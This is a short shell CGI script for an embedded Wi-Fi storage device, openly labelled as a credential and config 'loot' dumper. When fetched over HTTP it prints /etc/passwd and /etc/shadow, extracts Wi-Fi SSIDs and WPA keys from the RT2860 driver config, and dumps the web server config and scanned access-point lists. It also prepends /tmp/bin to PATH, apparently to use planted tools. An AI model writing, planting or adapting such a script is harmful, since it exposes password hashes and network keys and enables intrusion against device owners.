#!/bin/sh
echo "Content-type: text/plain"; echo
PATH=/tmp/bin:$PATH; export PATH
dump(){ echo "===== $1 ====="; cat "$1" 2>/dev/null || echo "(absent)"; echo; }
echo "# credential & config loot (local device only)"
echo
dump /etc/passwd
dump /etc/shadow
echo "===== wifi creds (RT2860.dat) ====="
grep -E "^SSID1=|^WPAPSK1=|ApCliSsid1=|ApCliWPAPSK=|AuthMode=|EncrypType=" \
     /boot/tmp/etc/Wireless/RT2860/RT2860.dat 2>/dev/null
echo
dump /etc/fileserv/lighttpd.conf
dump /tmp/ap_list.out
echo "===== last bridged / scanned APs ====="
ls -l /tmp/*.out 2>/dev/null
